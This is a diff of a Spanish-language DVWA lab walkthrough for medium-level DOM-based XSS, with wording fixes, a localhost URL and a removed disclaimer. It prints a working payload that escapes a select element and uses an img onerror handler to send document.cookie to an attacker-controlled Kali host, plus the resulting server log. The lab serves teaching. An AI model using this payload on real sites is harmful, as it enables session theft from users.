@@ -22,7 +22,7 @@ Robar la cookie de un usuario conectado explotando una vulnerabilidad Cross-Site
     A diferencia del nivel Bajo, el nivel Medio bloquea la cadena `<script`. Esto significa que los payloads directos que utilizaban la etiqueta `<script>` ya no funcionarán.
 
 3.  **Construir un payload XSS sin la etiqueta `<script>`:**
-    Para বাইপাসar esta restricción, utilizaremos la etiqueta `<img>` con un evento `onerror` para ejecutar código JavaScript.
+    Para evitar esta restricción, utilizaremos la etiqueta `<img>` con un evento `onerror` para ejecutar código JavaScript.
 
 4.  **Payload final para robar la cookie:**
     Dado que la entrada se inyecta en la primera opción de un desplegable (`<select>`), necesitamos "romper" la estructura HTML del dropdown para que nuestra etiqueta `<img>` se renderice correctamente y el código JavaScript se ejecute. El siguiente payload logra esto:
@@ -47,7 +47,7 @@ Robar la cookie de un usuario conectado explotando una vulnerabilidad Cross-Site
     Combina la URL de la página vulnerable con el payload inyectado en el parámetro `default`:
 
     ```
-    http://dvwa/dvwa/vulnerabilities/xss_d/?default=English</option></select><img id='pic' src=x onerror="var i = document.getElementById('pic'); i.setAttribute('src','http://[tu_IP_de_Kali]:9999/' + document.cookie); i.parentNode.removeChild(i); return false;")>
+    http://localhost/DVWA/vulnerabilities/xss_d/?default=English</option></select><img id='pic' src=x onerror="var i = document.getElementById('pic'); i.setAttribute('src','http://[tu_IP_de_Kali]:9999/' + document.cookie); i.parentNode.removeChild(i); return false;">
     ```
 
     **¡Importante!** Reemplaza `[tu_IP_de_Kali]` con la dirección IP de tu máquina Kali.
@@ -55,17 +55,17 @@ Robar la cookie de un usuario conectado explotando una vulnerabilidad Cross-Site
 6.  **Acceder a la URL maliciosa:**
     Pega esta URL en el navegador de la víctima (o en tu propio navegador si estás probando la vulnerabilidad).
 
+![Imagen vulnerabilidad XSS Dom 1](../../assets/XSSDomMedium01.png)
+
 7.  **Verificar el servidor web temporal:**
     Si la explotación es exitosa, tu servidor web temporal en Kali Linux debería recibir una petición GET. La ruta de esta petición contendrá la cookie del usuario conectado. Deberías ver algo similar a esto en los logs de tu servidor:
 
     ```
-    192.168.x.x - - [DD/Mon/YYYY HH:MM:SS] "GET /PHPSESSID=alguna_sesion;security=medium HTTP/1.1" 200 -
+    192.168.x.x - - [DD/Mon/YYYY HH:MM:SS] "GET /PHPSESSID=alguna_sesion;security=medium HTTP/1.1" 404 -
     ```
 
     La parte después de `/` es la cookie del usuario.
 
 ## ¡Felicidades!
 
-Has explotado con éxito la vulnerabilidad XSS de nivel Medio para robar la cookie de un usuario utilizando un payload que বাইপাসa la restricción de la etiqueta `<script>`.
-
-**Recuerda:** Esta demostración es con fines educativos en un entorno controlado. En escenarios reales, las protecciones pueden ser más robustas. El uso de esta información para actividades maliciosas es ilegal y no ético.
+Has explotado con éxito la vulnerabilidad XSS de nivel Medio para robar la cookie de un usuario utilizando un payload que evita la restricción de la etiqueta `<script>`.
